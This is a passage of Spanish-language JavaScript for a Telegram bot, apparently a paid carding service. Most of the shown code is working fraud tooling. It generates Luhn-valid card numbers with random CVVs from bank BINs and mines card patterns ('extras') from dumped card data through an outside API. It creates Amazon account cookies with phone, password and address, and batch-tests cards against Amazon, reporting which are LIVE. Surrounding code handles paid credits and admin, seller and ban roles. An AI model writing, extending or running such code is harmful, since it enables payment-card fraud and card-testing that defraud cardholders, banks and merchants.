        const digitoControl = calcularDigitoLuhn(primeros15);
        const numeroCompleto = primeros15 + digitoControl;
        let cvvGen = (cvv && cvv.toLowerCase() !== 'rnd') ? cvv.slice(0, 3) : Math.floor(100 + Math.random() * 900).toString();
        if (!/^\d{3}$/.test(cvvGen)) cvvGen = Math.floor(100 + Math.random() * 900).toString();
        tarjetas.push(`${numeroCompleto}|${mes}|${año}|${cvvGen}`);
    }
    return tarjetas;
}

// ==================== HANDLERS REUTILIZABLES ====================

async function handleBinlistCommand(chatId, telegramId, query) {
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
    await sendSafeMessage(chatId, `🔍 Buscando bins para: ${query}...`);
    const nameKey = query.toLowerCase().trim();
    let binsEncontrados = [];
    for (const [key, bins] of Object.entries(bankBins)) {
        if (nameKey.includes(key)) {
            binsEncontrados = bins;
            break;
        }
    }
    if (binsEncontrados.length === 0) binsEncontrados = ['415231', '426807', '557910', '549949', '481515'];
    const binsUnicos = [...new Set(binsEncontrados)];
    await sendSafeMessage(chatId, `📋 *Bins encontrados para ${query}:*\n\n💳 Lista de bins:\n${binsUnicos.join(', ')}`, { parse_mode: 'Markdown' });
}

async function handleExtrapoladorCommand(chatId, telegramId, input) {
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 10)) return;
    let bin = input;
    if (!/^\d{6}$/.test(input)) {
        await sendSafeMessage(chatId, `🔍 Obteniendo bins de ${input}...`);
        const binElegido = getBinForBank(input);
        if (!binElegido) { await sendSafeMessage(chatId, '❌ No se encontraron bins'); return; }
        bin = binElegido;
        await sendSafeMessage(chatId, `✅ Usando BIN: ${bin}`);
    }
    await sendSafeMessage(chatId, `🔮 Extrapolando para BIN ${bin}...`);
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 180000);
        const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bin }), signal: controller.signal
        });
        clearTimeout(timeoutId);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (!data.success || !data.data || data.data.length === 0) throw new Error('Sin resultados');
        const patrones = {};
        for (const tarjeta of data.data) {
            const partes = tarjeta.split('|');
            if (partes.length < 3) continue;
            const numero = partes[0];
            if (numero.length !== 16) continue;
            const prefix = numero.slice(0, 12);
            const clave = `${prefix}xxxx|${partes[1]}|${partes[2]}`;
            patrones[clave] = (patrones[clave] || 0) + 1;
        }
        if (Object.keys(patrones).length === 0) throw new Error('No se extrajeron patrones');
        const muy = [], mod = [], uni = [];
        for (const [patron, count] of Object.entries(patrones)) {
            if (count >= 3) muy.push({ patron, count });
            else if (count === 2) mod.push({ patron, count });
            else uni.push({ patron, count });
        }
        muy.sort((a,b) => b.count - a.count);
        mod.sort((a,b) => b.count - a.count);
        uni.sort((a,b) => b.count - a.count);
        let mensaje = `=== EXTRAPOLADOR - RESULTADOS ===\n\n`;
        if (muy.length) {
            mensaje += `🟢 MUY REPETIDOS (${muy.length}):\n`;
            for (const p of muy.slice(0,15)) {
                const [prefixWithX, mes, año] = p.patron.split('|');
                const prefix = prefixWithX.slice(0, 12);
                mensaje += `\`${prefix}xxxx|${mes}|${año}|rnd\` (${p.count} veces)\n`;
            }
            mensaje += `\n`;
        }
        if (mod.length) {
            mensaje += `🟡 MODERADOS (${mod.length}):\n`;
            for (const p of mod.slice(0,15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `\`${prefix}xxxx|${mes}|${año}|rnd\` (${p.count} veces)\n`;
            }
            mensaje += `\n`;
        }
        if (uni.length) {
            mensaje += `🔴 ÚNICOS (${uni.length}):\n`;
            for (const p of uni.slice(0,20)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `\`${prefix}xxxx|${mes}|${año}|rnd\` (${p.count} vez)\n`;
            }
        }
        if (mensaje.length > 4090) mensaje = mensaje.substring(0,4000) + "\n...";
        await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
        const creditResult = await deductCredits(telegramId, 10);
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
}

async function handleGenCommand(chatId, telegramId, fullParam) {
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 4)) return;
    let cantidad = 10;
    let input = fullParam;
    const cantMatch = input.match(/\s+(\d+)$/);
    if (cantMatch) {
        cantidad = parseInt(cantMatch[1]);
        if (cantidad > 50) cantidad = 50;
        input = input.substring(0, cantMatch.index);
    }
    const tieneX = /[Xx]/.test(input);
    const tieneFecha = /\d{1,2}[\/\-|]\d{2,4}/.test(input);
    const esExtra = tieneX && tieneFecha && (tieneX || input.trim().split('|')[0].length < 16);
    const esBin = /^\d{6}$/.test(input.trim());
    const esBanco = !esExtra && !esBin;
    try {
        if (esExtra) {
            let normalized = input.trim().replace(/[ /-]+/g, '|');
            normalized = normalized.replace(/\|+/g, '|');
            const partes = normalized.split('|');
            if (partes.length >= 3) {
                let [numBase, mes, año, cvv] = partes;
                if (año.length === 2) año = '20' + año;
                if (!cvv) cvv = 'rnd';
                normalized = `${numBase}|${mes}|${año}|${cvv}`;
            }
            const tarjetas = generarTarjetasDesdePatron(normalized, cantidad);
            const lista = tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n');
            const resto = tarjetas.length > 20 ? `\n... y ${tarjetas.length-20} más` : '';
            await sendSafeMessage(chatId, `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
        } else if (esBin) {
            await sendSafeMessage(chatId, `🔮 Extrapolando BIN ${input}...`);
            const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bin: input })
            });
            const data = await response.json();
            if (!data.success || !data.data || !data.data.length) throw new Error('No se encontraron tarjetas');
            const patrones = {};
            for (const tarjeta of data.data) {
                const partes = tarjeta.split('|');
                if (partes.length < 3) continue;
                const num = partes[0];
                if (num.length !== 16) continue;
                const pref = num.slice(0,12);
                const clave = `${pref}xxxx|${partes[1]}|${partes[2]}`;
                patrones[clave] = (patrones[clave] || 0) + 1;
            }
            const items = Object.entries(patrones).map(([p,c]) => ({ patron: p, count: c }));
            const muy = items.filter(i => i.count >= 3).sort((a,b)=>b.count-a.count);
            const mod = items.filter(i => i.count === 2).sort((a,b)=>b.count-a.count);
            const uni = items.filter(i => i.count === 1).sort((a,b)=>b.count-a.count);
            const mejor = muy[0] || mod[0] || uni[0];
            const [prefijo, mes, año] = mejor.patron.split('|');
            const extraElegido = `${prefijo}xxxx|${mes}|${año}|rnd`;
            let mensaje = `=== EXTRAPOLACIÓN COMPLETADA ===\n✅ EXTRA A GENERAR: \`${prefijo}xxxx | ${mes}/${año}\` | (${mejor.count} veces)\n\n`;
            if (muy.length) mensaje += `🟢 MUY REPETIDOS (${muy.length}):\n${muy.slice(0,10).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}xxxx | ${m}/${a} | (${p.count} veces)`; }).join('\n')}\n\n`;
            if (mod.length) mensaje += `🟡 MODERADOS (${mod.length}):\n${mod.slice(0,5).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}xxxx | ${m}/${a} | (${p.count} veces)`; }).join('\n')}\n\n`;
            if (uni.length) mensaje += `🔴 ÚNICOS (${uni.length}):\n${uni.slice(0,10).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}xxxx | ${m}/${a} | (${p.count} vez)`; }).join('\n')}`;
            await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
            const tarjetas = generarTarjetasDesdePatron(extraElegido, cantidad);
            const lista = tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n');
            const resto = tarjetas.length > 20 ? `\n... y ${tarjetas.length-20} más` : '';
            await sendSafeMessage(chatId, `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
            const creditResult = await deductCredits(telegramId, 10);
            if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
        } else if (esBanco) {
            await sendSafeMessage(chatId, `🔍 Buscando bins de "${input}"...`);
            const binElegido = getBinForBank(input);
            if (!binElegido) throw new Error('No se encontraron bins');
            await sendSafeMessage(chatId, `✅ BIN elegido: ${binElegido}`);
            await handleGenCommand(chatId, telegramId, `${binElegido} ${cantidad}`);
            return;
        } else {
            throw new Error('No se pudo detectar el formato');
        }
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
}

async function handleGenCookieCommand(chatId, telegramId, country) {
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 4)) return;
    const paises = ['MX','US','CA','UK','DE','FR','IT','ES','JP','AU','IN'];
    if (!paises.includes(country)) { await sendSafeMessage(chatId, '❌ País inválido.'); return; }
    await sendSafeMessage(chatId, `🔄 Generando cookie para ${country}...`);
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 1200000);
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country, add_address: true }), signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (!data.success) throw new Error(data.error || 'Error');
        const { phone, password, cookie_string, country: ctry } = data.data;
        await updateUserCookie(telegramId, cookie_string);
        const creditResult = await deductCredits(telegramId, 4);
        await pool.query('UPDATE users SET cookies_generated = cookies_generated + 1 WHERE telegram_id = $1', [telegramId]);

        let msgText = `🍪 *Cookie ${ctry}*\n📞 Tel: \`${phone}\`\n🔑 Pass: \`${password}\`\n🍪 *Cookie string:*\n\`\`\`\n${cookie_string}\n\`\`\``;
        if (creditResult) msgText += `\n💰 Créditos restantes: ${creditResult.newCredits}`;
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
        await sendSafeMessage(chatId, msgText, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
}

async function handleSetCookieCommand(chatId, telegramId, cookie) {
    if (!cookie) { await sendSafeMessage(chatId, '❌ No se proporcionó cookie.'); return; }
    await updateUserCookie(telegramId, cookie);
    await sendSafeMessage(chatId, '✅ Cookie guardada.');
}

async function handleAmazonCommand(chatId, telegramId, param) {
    const user = await getUserByTelegramId(telegramId);
    if (!user) return sendSafeMessage(chatId, '❌ Usa /start primero.');
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
    let cookie = user.cookie;
    if (!cookie) {
        await sendSafeMessage(chatId, '🔑 No tienes cookie. Usa /gencookie primero.');
        return;
    }

    let tarjetas = limpiarTarjetas(param);
    if (tarjetas.length > 0) {
        if (tarjetas.length > 20) return sendSafeMessage(chatId, '⚠️ Máximo 20 tarjetas.');
        await sendSafeMessage(chatId, `💳 *Tarjetas a verificar (${tarjetas.length}):*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
        const total = tarjetas.length;
        let progressMsg = await sendSafeMessage(chatId, `🔍 Verificando 0/${total}...`);
        const resultados = [];
        for (let i = 0; i < total; i++) {
            const card = tarjetas[i];
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 120000);
                const resp = await fetch(API_AMAZON_CHECK_URL, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
                });
                clearTimeout(timeoutId);
                const data = await resp.json();
                const isFatalError = data.message && (
                    data.message.toLowerCase().includes('cookie expirada') ||
                    data.message.toLowerCase().includes('inicia sesión') ||
                    data.message.toLowerCase().includes('cuenta baneada') ||
                    data.message.toLowerCase().includes('account banned') ||
                    data.message.toLowerCase().includes('entra a mi cuenta')
                );
                resultados.push({ card, status: data.status, message: data.message });
                if (isFatalError) {
                    await sendSafeMessage(chatId, `⛔ Error fatal: ${data.message}. No se continuará.`);
                    break;
                }
            } catch (err) {
                resultados.push({ card, status: 'ERROR', message: err.message });
            }
            const emoji = resultados[i].status === 'LIVE' ? '✅' : (resultados[i].status === 'DEAD' ? '❌' : '⚠️');
            try {
                await bot.editMessageText(`🔍 Verificando ${i+1}/${total}\nÚltima: ${card} → ${resultados[i].status} ${emoji}`, { chat_id: chatId, message_id: progressMsg.message_id });
            } catch (e) {}
            await new Promise(r => setTimeout(r, 800));
        }
        const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
        let resumen = `📊 *Resultados finales*\n${separador}\n`;
        for (const r of resultados) {
            const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
            resumen += `• Card: \`${r.card}\`\n• Status: ${r.status} ${emoji}\n${separador}\n`;
        }
        if (resumen.length > 4096) resumen = resumen.substring(0,4000) + '...';
        await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
        return;
    }

    let normalizedParam = normalizarExtra(param);
    const tienePipe = normalizedParam.includes('|');
    const tieneFecha = /\d{1,2}[\/\-|]\d{2,4}/.test(normalizedParam);
    const esExtra = tienePipe && tieneFecha;
    const esBin = !esExtra && /^\d{6}$/.test(param.trim());
    const esBanco = !esExtra && !esBin && getBinForBank(param) !== null;

    try {
        if (esExtra) {
            tarjetas = generarTarjetasDesdePatron(normalizedParam, 20);
            let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
            await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
        } else if (esBin) {
            await sendSafeMessage(chatId, `🔮 Extrapolando BIN ${param}...`);
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 180000);
            const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bin: param }), signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await response.json();
            if (!data.success || !data.data.length) throw new Error('Sin resultados');
            const patrones = {};
            for (const tarjeta of data.data) {
                const partes = tarjeta.split('|');
                if (partes.length < 3) continue;
                const numero = partes[0];
                if (numero.length !== 16) continue;
                const prefix = numero.slice(0,12);
                const clave = `${prefix}xxxx|${partes[1]}|${partes[2]}`;
                patrones[clave] = (patrones[clave] || 0) + 1;
            }
            const ordenados = Object.entries(patrones).map(([p,c]) => ({ patron: p, count: c })).sort((a,b) => b.count - a.count);
            const mejor = ordenados[0];
            const [prefix, mes, año] = mejor.patron.split('|');
            const extraElegido = `${prefix}xxxx|${mes}|${año}|rnd`;
            let mensajeResumen = `=== EXTRAPOLACIÓN COMPLETADA ===\n✅ EXTRA A CHECAR: \`${prefix}xxxx | ${mes}/${año}\` | (${mejor.count} veces)\n\n`;
            const muy = ordenados.filter(p => p.count >= 3).slice(0,10);
            const mod = ordenados.filter(p => p.count === 2).slice(0,5);
            const uni = ordenados.filter(p => p.count === 1).slice(0,10);
            if (muy.length) mensajeResumen += `🟢 MUY REPETIDOS:\n${muy.map(p => p.patron.split('|').slice(0,2).join(' | ') + ` (${p.count} veces)`).join('\n')}\n\n`;
            if (mod.length) mensajeResumen += `🟡 MODERADOS:\n${mod.map(p => p.patron.split('|').slice(0,2).join(' | ') + ` (${p.count} veces)`).join('\n')}\n\n`;
            if (uni.length) mensajeResumen += `🔴 ÚNICOS:\n${uni.map(p => p.patron.split('|').slice(0,2).join(' | ') + ` (${p.count} vez)`).join('\n')}`;
            await sendSafeMessage(chatId, mensajeResumen, { parse_mode: 'Markdown' });
            tarjetas = generarTarjetasDesdePatron(extraElegido, 20);
            let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
            await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
        } else if (esBanco) {
            const binElegido = getBinForBank(param);
            if (!binElegido) throw new Error('No se encontraron bins');
            await sendSafeMessage(chatId, `🔍 Banco detectado. Usando BIN: ${binElegido}`);
            await handleAmazonCommand(chatId, telegramId, binElegido);
            return;
        } else {
            throw new Error('Formato no reconocido. Envía un BIN, un extra o una lista de tarjetas.');
        }

        const total = tarjetas.length;
        let progressMsg = await sendSafeMessage(chatId, `🔍 Verificando 0/${total}...`);
        const resultados = [];
        for (let i = 0; i < total; i++) {
            const card = tarjetas[i];
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 120000);
                const resp = await fetch(API_AMAZON_CHECK_URL, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
                });
                clearTimeout(timeoutId);
                const data = await resp.json();
                const isFatalError = data.message && (
                    data.message.toLowerCase().includes('cookie expirada') ||
                    data.message.toLowerCase().includes('inicia sesión') ||
                    data.message.toLowerCase().includes('cuenta baneada') ||
                    data.message.toLowerCase().includes('account banned') ||
                    data.message.toLowerCase().includes('entra a mi cuenta')
                );
                resultados.push({ card, status: data.status, message: data.message });
                if (isFatalError) {
                    await sendSafeMessage(chatId, `⛔ Error fatal: ${data.message}. No se continuará.`);
                    break;
                }
            } catch (err) {
                resultados.push({ card, status: 'ERROR', message: err.message });
            }
            const emoji = resultados[i].status === 'LIVE' ? '✅' : (resultados[i].status === 'DEAD' ? '❌' : '⚠️');
            try {
                await bot.editMessageText(`🔍 Verificando ${i+1}/${total}\nÚltima: ${card} → ${resultados[i].status} ${emoji}`, { chat_id: chatId, message_id: progressMsg.message_id });
            } catch (e) {}
            await new Promise(r => setTimeout(r, 800));
        }
        const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
        let resumen = `📊 *Resultados finales*\n${separador}\n`;
        for (const r of resultados) {
            const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
            resumen += `• Card: \`${r.card}\`\n• Status: ${r.status} ${emoji}\n${separador}\n`;
        }
        if (resumen.length > 4096) resumen = resumen.substring(0,4000) + '...';
        await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
}

async function handleLimpiadorCommand(chatId, telegramId, texto) {
    const tarjetas = limpiarTarjetas(texto);
    if (tarjetas.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron tarjetas.');
    const lista = tarjetas.slice(0,30).map(t => `\`${t}\``).join('\n');
    await sendSafeMessage(chatId, `🔍 *Tarjetas encontradas (${tarjetas.length}):*\n${lista}`, { parse_mode: 'Markdown' });
}

// ==================== COMANDOS ====================

bot.onText(/^[\/\.]info(?:\s+([^\s]+))?/i, async (msg, match) => {
    const args = match[1] ? match[1].trim().split(/\s+/) : [];    
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    let target = args[0];
    if (!target && msg.reply_to_message && msg.reply_to_message.text) {
        target = msg.reply_to_message.text.trim();
    }
    if (target && /^\d+$/.test(target) && parseInt(target) < 10000) {
        // Probablemente no es un ID real, pedir de nuevo
        target = null;
    }
    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin' && role !== 'seller') {
        return sendSafeMessage(chatId, '❌ No tienes permiso para usar este comando.');
    }
    if (!target) {
        setUserState(requesterId, { step: 'awaiting_info_target' });
        return sendSafeMessage(chatId, '👤 Envía el username o ID del usuario:');
    }
    try {
        const user = await findUserByUsernameOrId(target, role);
        const createdDate = new Date(user.created_at).toLocaleDateString();
        const msgText = `📋 *Información del usuario*\n` +
                        `🆔 ID: ${user.id}\n` +
                        `👤 Usuario: ${user.username}\n` +
                        `💰 Créditos: ${user.credits}\n` +
                        `📅 Días restantes: ${user.days_remaining}\n` +
                        `⭐ Rol: ${user.role.toUpperCase()}\n` +
                        `📆 Registro: ${createdDate}\n` +
                        `📊 Mensajes enviados: ${user.total_checks || 0}`;
        await sendSafeMessage(chatId, msgText, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});


async function changeRole(chatId, requesterId, target, newRole) {
    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin') return sendSafeMessage(chatId, '❌ Solo administradores pueden cambiar roles.');
    if (!target) throw new Error('Falta el usuario');
    const user = await findUserByUsernameOrId(target, role);
    await callApiWithBotKey(`/admin/users/${user.id}/role`, 'PUT', { new_role: newRole });
    await sendSafeMessage(chatId, `✅ Rol de ${user.username} cambiado a ${newRole.toUpperCase()}.`);
}

bot.onText(/^[\/\.]setadmin(?:\s+([^\s]+))?/i, async (msg, match) => {
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    let target = args[0];
    if (!target && msg.reply_to_message && msg.reply_to_message.text) target = msg.reply_to_message.text.trim();
    if (!target) {
        setUserState(requesterId, { step: 'awaiting_setadmin' });
        return sendSafeMessage(chatId, '👑 Envía @usuario|id para hacerlo administrador:');
    }
    try {
        await changeRole(chatId, requesterId, target, 'admin');
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

bot.onText(/^[\/\.]setseller(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let target = args[0];
    if (!target && msg.reply_to_message && msg.reply_to_message.text) target = msg.reply_to_message.text.trim();
    if (!target) {
        setUserState(requesterId, { step: 'awaiting_setseller' });
        return sendSafeMessage(chatId, '🛒 Envía @usuario|id para hacerlo vendedor:');
    }
    try {
        await changeRole(chatId, requesterId, target, 'seller');
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

bot.onText(/^[\/\.]setuser(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let target = args[0];
    if (!target && msg.reply_to_message && msg.reply_to_message.text) target = msg.reply_to_message.text.trim();
    if (!target) {
        setUserState(requesterId, { step: 'awaiting_setuser' });
        return sendSafeMessage(chatId, '👤 Envía @usuario|id para degradarlo a usuario normal:');
    }
    try {
        await changeRole(chatId, requesterId, target, 'user');
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

async function setUserStatus(chatId, requesterId, target, active) {
    const role = await getUserRoleFromDB(requesterId);
    if (role !== 'admin') return sendSafeMessage(chatId, '❌ Solo administradores pueden banear/desbanear.');
    if (!target) throw new Error('Falta el usuario');
    const user = await findUserByUsernameOrId(target, role);
    await callApiWithBotKey(`/admin/users/${user.id}/status`, 'PUT', { is_active: active });
    const estado = active ? 'activado' : 'baneado';
    await sendSafeMessage(chatId, `✅ Usuario ${user.username} ha sido ${estado}.`);
}

bot.onText(/^[\/\.]ban(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let target = args[0];
    if (!target && msg.reply_to_message && msg.reply_to_message.text) target = msg.reply_to_message.text.trim();
    if (!target) {
        setUserState(requesterId, { step: 'awaiting_ban' });
        return sendSafeMessage(chatId, '⛔ Envía @usuario|id para banearlo:');
    }
    try {
        await setUserStatus(chatId, requesterId, target, false);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

bot.onText(/^[\/\.]unban(?:\s+([^\s]+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const requesterId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let target = args[0];
    if (!target && msg.reply_to_message && msg.reply_to_message.text) target = msg.reply_to_message.text.trim();
    if (!target) {
        setUserState(requesterId, { step: 'awaiting_unban' });
        return sendSafeMessage(chatId, '✅ Envía @usuario|id para desbanearlo:');
    }
    try {
        await setUserStatus(chatId, requesterId, target, true);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

bot.onText(/[\/\.]start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const telegramId = from.id;
    const username = from.username || telegramId.toString();
    const fullName  = (from.first_name || '') + (from.last_name ? ' ' + from.last_name : '');
    const chatType = msg.chat.type;

    try {
        const existing = await getUserByTelegramId(telegramId);
        const isNew = !existing;
        await upsertUser(telegramId, username, fullName, chatId, chatType);
        if (isNew) {
            await sendSafeMessage(chatId,
                `👋 ¡Hola ${fullName}! 👋\n\nHe guardado tu Chat ID: <code>${telegramId}</code>\n\nRegístrate en la web: https://astralchk.com/login.html con usuario @${username}`, { parse_mode: 'HTML' });
        } else {

            await sendSafeMessage(chatId,
                `👋 ¡Hola ${fullName}!\n💰 Créditos: ${existing.credits}\n📅 Días: ${existing.days_remaining}\n\nUsa /menu para ver comandos.`, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error(error);
        await sendSafeMessage(chatId, '❌ Error interno.');
    }
});

bot.onText(/^[\/\.](?:gencookie|gencuki|genck|gnck)(?:\s+(\w+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let country = args[0] ? args[0].toUpperCase() : null;
    if (!country && msg.reply_to_message && msg.reply_to_message.text) {
        country = msg.reply_to_message.text.trim().toUpperCase();
    }
    if (!country) {
        setUserState(telegramId, { step: 'awaiting_gencookie_country' });
        return sendSafeMessage(chatId, '🌎 ¿País? (MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN)');
    }
    await handleGenCookieCommand(chatId, telegramId, country);
    clearUserState(telegramId);
});

bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)/i, async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let param = getCommandParam(msg, 'amazoncookie') || getCommandParam(msg, 'amazoncuki') || getCommandParam(msg, 'amazonck') || getCommandParam(msg, 'amzck');
    if (!param && msg.reply_to_message && msg.reply_to_message.text) {
        param = msg.reply_to_message.text.trim();
    }
    if (param) param = param.trim();
    if (param === '') param = null;
    
    clearUserState(telegramId);
    
    if (!param) {
        await sendSafeMessage(chatId, '🍪 Generando nueva cookie...');
        try {
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
            });
            const data = await response.json();
            if (!data.success) throw new Error('Error al generar cookie');
            const cookie = data.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult?.newCredits || '?'}.`);
            setUserState(telegramId, { step: 'awaiting_amazon_cards' });
            await sendSafeMessage(chatId, '💳 Envía las tarjetas (una por línea o con separadores):');
        } catch (err) {
            await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
        }
        return;
    }
    
    let tarjetas = limpiarTarjetas(param);
    let esBin = /^\d{6}$/.test(param);
    let esBanco = !esBin && getBinForBank(param) !== null;
    
    if (tarjetas.length > 0) {
        if (tarjetas.length > 20) return sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas.`);
        await sendSafeMessage(chatId, `💳 *Tarjetas a verificar (${tarjetas.length}):*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
        await sendSafeMessage(chatId, '🍪 Generando cookie para verificación...');
        try {
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
            });
            const data = await response.json();
            if (!data.success) throw new Error('Error al generar cookie');
            const cookie = data.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult?.newCredits || '?'}.`);
            await verificarTarjetasConCookie(chatId, cookie, tarjetas, null);
        } catch (err) {
            await sendSafeMessage(chatId, `❌ Error al generar cookie: ${err.message}`);
        }
        return;
    }
    
    if (esBin || esBanco) {
        await sendSafeMessage(chatId, '🔄 Procesando en paralelo: generando cookie y extrapolando...');
        let cookie = null;
        let extrapolation = null;
        let cookieError = null;
        let extrapolationError = null;
        try {
            [cookie, extrapolation] = await Promise.all([
                (async () => {
                    try {
                        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
                        });
                        const data = await response.json();
                        if (!data.success) throw new Error('Error al generar cookie');
                        await updateUserCookie(telegramId, data.data.cookie_string);
                        const creditResult = await deductCredits(telegramId, 4);
                        await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult?.newCredits || '?'}.`);
                        return data.data.cookie_string;
                    } catch (err) {
                        cookieError = err;
                        return null;
                    }
                })(),
                (async () => {
                    try {
                        const binParam = esBanco ? getBinForBank(param) : param;
                        return await prepararExtrapolacion(chatId, telegramId, binParam);
                    } catch (err) {
                        extrapolationError = err;
                        return null;
                    }
                })()
            ]);
            if (cookieError) throw cookieError;
            if (extrapolationError) throw extrapolationError;
            if (!extrapolation || !extrapolation.tarjetas || extrapolation.tarjetas.length === 0) {
                throw new Error('No se generaron tarjetas válidas');
            }
            await verificarTarjetasConCookie(chatId, cookie, extrapolation.tarjetas, extrapolation.mensajePrevio);
        } catch (err) {
